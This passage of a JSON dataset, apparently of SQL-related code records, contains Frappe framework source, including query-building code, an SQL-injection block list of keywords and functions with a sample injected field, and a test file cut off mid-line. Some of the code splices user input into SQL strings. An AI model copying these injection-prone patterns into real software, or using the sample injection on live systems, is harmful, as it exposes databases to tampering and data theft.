{1}\".format(doctype, order_by_based_on_meta)\n\n\t\t\tvalues = frappe.get_list(doctype,\n\t\t\t\tfilters=filters, fields=formatted_fields,\n\t\t\t\tor_filters = or_filters, limit_start = start,\n\t\t\t\tlimit_page_length=page_length,\n\t\t\t\torder_by=order_by,\n\t\t\t\tignore_permissions = True if doctype == \"DocType\" else False, # for dynamic links\n\t\t\t\tas_list=not as_dict)\n\n\t\t\t# remove _relevance from results\n\t\t\tif as_dict:\n\t\t\t\tfor r in values:\n\t\t\t\t\tr.pop(\"_relevance\")\n\t\t\t\tfrappe.response[\"values\"] = values\n\t\t\telse:\n\t\t\t\tfrappe.response[\"values\"] = [r[:-1] for r in values]\n\ndef get_std_fields_list(meta, key):\n\t# get additional search fields\n\tsflist = meta.search_fields and meta.search_fields.split(\",\") or []\n\ttitle_field = [meta.title_field] if (meta.title_field and meta.title_field not in sflist) else []\n\tsflist = ['name'] + sflist + title_field\n\tif not key in sflist:\n\t\tsflist = sflist + [key]\n\n\treturn sflist\n\ndef build_for_autosuggest(res):\n\tresults = []\n\tfor r in res:\n\t\tout = {\"value\": r[0], \"description\": \", \".join(unique(cstr(d) for d in r if d)[1:])}\n\t\tresults.append(out)\n\treturn results\n\ndef scrub_custom_query(query, key, txt):\n\tif '%(key)s' in query:\n\t\tquery = query.replace('%(key)s', key)\n\tif '%s' in query:\n\t\tquery = query.replace('%s', ((txt or '') + '%'))\n\treturn query\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/vhrspvl/hd-frappe/blob/9e2e65f3054c52652b3491713f28d80b80efdfd3",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nfrom six import iteritems, string_types\n\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy, re\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.user_settings import get_user_settings, update_user_settings\nfrom datetime import datetime\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,\n\t\tupdate=None, add_total_row=None, user_settings=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))\n\t\t\traise frappe.PermissionError(self.doctype)\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], string_types):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.user_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif user_settings:\n\t\t\tself.user_settings = json.loads(user_settings)\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_user_settings:\n\t\t\tself.save_user_settings_fields = save_user_settings_fields\n\t\t\tself.update_user_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.sanitize_fields()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t ' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\n\t\tself.validate_order_by_and_group_by(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by(self.group_by)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, string_types):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, string_types):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in iteritems(fdict):\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef sanitize_fields(self):\n\t\t'''\n\t\t\tregex : ^.*[,();].*\n\t\t\tpurpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each\n\t\t\t\t\tfield which may leads to sql injection.\n\t\t\texample :\n\t\t\t\tfield = \"`DocType`.`issingle`, version()\"\n\n\t\t\tAs field contains `,` and mysql function `version()`, with the help of regex\n\t\t\tthe system will filter out this field.\n\t\t'''\n\t\tregex = re.compile('^.*[,();].*')\n\t\tblacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']\n\t\tblacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',\n\t\t\t'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',\n\t\t\t'system_user', 'user', 'version']\n\n\t\tdef _raise_exception():\n\t\t\tfrappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)\n\n\t\tfor field in self.fields:\n\t\t\tif regex.match(field):\n\t\t\t\tif any(keyword in field.lower() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"{0}(\".format(keyword) in field.lower() \\\n\t\t\t\t\tfor keyword in blacklisted_functions):\n\t\t\t\t\t_raise_exception()\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f) or (\"count(\" in f):\n\t\t\t\t\tcontinue\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))\n\t\t\traise frappe.PermissionError(doctype)\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, string_types):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions, ignore_permissions=None):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif ignore_permissions is not None:\n\t\t\tself.flags.ignore_permissions = ignore_permissions\n\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, string_types):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator.lower() in ('in', 'not in'):\n\t\t\tvalues = f.value or ''\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator.lower() == 'between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\n\t\t\t\tvalue = get_between_date_filter(f.value, df)\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif (df and df.fieldtype==\"Datetime\") or isinstance(f.value, datetime):\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator.lower() in (\"like\", \"not like\") or (isinstance(f.value, string_types) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator.lower() in (\"like\", \"not like\") and isinstance(value, string_types):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, string_types) and not f.operator.lower() == 'between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator.lower() in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.permissions.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcond = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tif not cint(frappe.get_system_settings(\"apply_strict_user_permissions\")):\n\t\t\t\t\t\tcondition = cond + \" or \"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcondition = \"\"\n\t\t\t\t\tcondition += \"\"\"`tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values]))\n\t\t\t\telse:\n\t\t\t\t\tcondition = cond\n\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by(self, parameters):\n\t\t\"\"\"Check order by, group by so that atleast one column is selected and does not have subquery\"\"\"\n\t\tif not parameters:\n\t\t\treturn\n\n\t\t_lower = parameters.lower()\n\t\tif 'select' in _lower and ' from ' in _lower:\n\t\t\tfrappe.throw(_('Cannot use sub-query in order by'))\n\n\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.strip().startswith(\"`tab\"):\n\t\t\t\ttbl = field.strip().split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort/group\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_user_settings(self):\n\t\t# update user settings if new search\n\t\tuser_settings = json.loads(get_user_settings(self.doctype))\n\n\t\tif hasattr(self, 'user_settings'):\n\t\t\tuser_settings.update(self.user_settings)\n\n\t\tif self.save_user_settings_fields:\n\t\t\tuser_settings['fields'] = self.user_settings_fields\n\n\t\tupdate_user_settings(self.doctype, user_settings)\n\ndef get_order_by(doctype, meta):\n\torder_by = \"\"\n\n\tsort_field = sort_order = None\n\tif meta.sort_field and ',' in meta.sort_field:\n\t\t# multiple sort given in doctype definition\n\t\t# Example:\n\t\t# `idx desc, modified desc`\n\t\t# will covert to\n\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\torder_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,\n\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\telse:\n\t\tsort_field = meta.sort_field or 'modified'\n\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\torder_by = \"`tab{0}`.`{1}` {2}\".format(doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t# draft docs always on top\n\tif meta.is_submittable:\n\t\torder_by = \"`tab{0}`.docstatus asc, {1}\".format(doctype, order_by)\n\n\treturn order_by\n\n\n@frappe.whitelist()\ndef get_list(doctype, *args, **kwargs):\n\t'''wrapper for DatabaseQuery'''\n\tkwargs.pop('cmd', None)\n\treturn DatabaseQuery(doctype).execute(None, *args, **kwargs)\n\ndef is_parent_only_filter(doctype, filters):\n\t#check if filters contains only parent doctype\n\tonly_parent_doctype = True\n\n\tif isinstance(filters, list):\n\t\tfor flt in filters:\n\t\t\tif doctype not in flt:\n\t\t\t\tonly_parent_doctype = False\n\t\t\tif 'Between' in flt:\n\t\t\t\tflt[3] = get_between_date_filter(flt[3])\n\n\treturn only_parent_doctype\n\ndef get_between_date_filter(value, df=None):\n\t'''\n\t\treturn the formattted date as per the given example\n\t\t[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'\n\t'''\n\tfrom_date = None\n\tto_date = None\n\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\"\n\n\tif df:\n\t\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\" if df.fieldtype == 'Datetime' else \"%Y-%m-%d\"\n\n\tif value and isinstance(value, (list, tuple)):\n\t\tif len(value) >= 1: from_date = value[0]\n\t\tif len(value) >= 2: to_date = value[1]\n\n\tif not df or (df and df.fieldtype == 'Datetime'):\n\t\tto_date = add_to_date(to_date,days=1)\n\n\tdata = \"'%s' AND '%s'\" % (\n\t\tget_datetime(from_date).strftime(date_format),\n\t\tget_datetime(to_date).strftime(date_format))\n\n\treturn data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/vhrspvl/hd-frappe/blob/9e2e65f3054c52652b3491713f28d80b80efdfd3",
        "file_path": "/frappe/tests/test_db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\nfrom __future__ import unicode_literals\n\nimport frappe, unittest\n\nfrom frappe.model.db_query import DatabaseQuery\nfrom frappe.desk.reportview import get_filters_cond\n\nclass TestReportview(unittest.TestCase):\n\tdef test_basic(self):\n\t\tself.assertTrue({\"name\":\"DocType\"} in DatabaseQuery(\"DocType\").execute(limit_page_length=None))\n\n\tdef test_fields(self):\n\t\tself.assertTrue({\"name\":\"DocType\", \"issingle\":0} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(fields=[\"name\", \"issingle\"], limit_page_length=None))\n\n\tdef test_filters_1(self):\n\t\tself.assertFalse({\"name\":\"DocType\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters=[[\"DocType\", \"name\", \"like\", \"J%\"]]))\n\n\tdef test_filters_2(self):\n\t\tself.assertFalse({\"name\":\"DocType\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters=[{\"name\": [\"like\", \"J%\"]}]))\n\n\tdef test_filters_3(self):\n\t\tself.assertFalse({\"name\":\"DocType\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"like\", \"J%\"]}))\n\n\tdef test_filters_4(self):\n\t\tself.assertTrue({\"name\":\"DocField\"} \\\n\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": \"DocField\"}))\n\n\tdef test_in_not_in_filters(self):\n\t\tself.assertFalse(DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"in\", None]}))\n\t\tself.assertTrue({\"name\":\"DocType\"} \\\n\t\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"not in\", None]}))\n\n\t\tfor result in [{\"name\":\"DocType\"}, {\"name\":\"DocField\"}]:\n\t\t\tself.assertTrue(result\n\t\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"in\", 'DocType,DocField']}))\n\n\t\tfor result in [{\"name\":\"DocType\"}, {\"name\":\"DocField\"}]:\n\t\t\tself.assertFalse(result\n\t\t\t\tin DatabaseQuery(\"DocType\").execute(filters={\"name\": [\"not in\", 'DocType,DocField']}))\n\n\tdef test_or_filters(self):\n\t\tdata = DatabaseQuery(\"DocField\").execute(\n\t\t\t\tfilters={\"parent\": \"DocType\"}, fields=[\"fieldname\", \"fieldtype\"],\n\t\t\t\tor_filters=[{\"fieldtype\":\"Table\"}, {\"fieldtype\":\"Select\"}])\n\n\t\tself.assertTrue({\"fieldtype\":\"Table\", \"fieldname\":\"fields\"} in data)\n\t\tself.assertTrue({\"fieldtype\":\"Select\", \"fieldname\":\"document_type\"} in data)\n\t\tself.assertFalse({\"fieldtype\":\"Check\", \"fieldname\":\"issingle\"} in data)\n\n\tdef test_between_filters(self):\n\t\t\"\"\" test case to check between filter for date fields \"\"\"\n\t\tfrappe.db.sql(\"delete from tabEvent\")\n\n\t\t# create events to test the between operator filter\n\t\ttodays_event = create_event()\n\t\tevent1 = create_event(starts_on=\"2016-07-05 23:59:59\")\n\t\tevent2 = create_event(starts_on=\"2016-07-06 00:00:00\")\n\t\tevent3 = create_event(starts_on=\"2016-07-07 23:59:59\")\n\t\tevent4 = 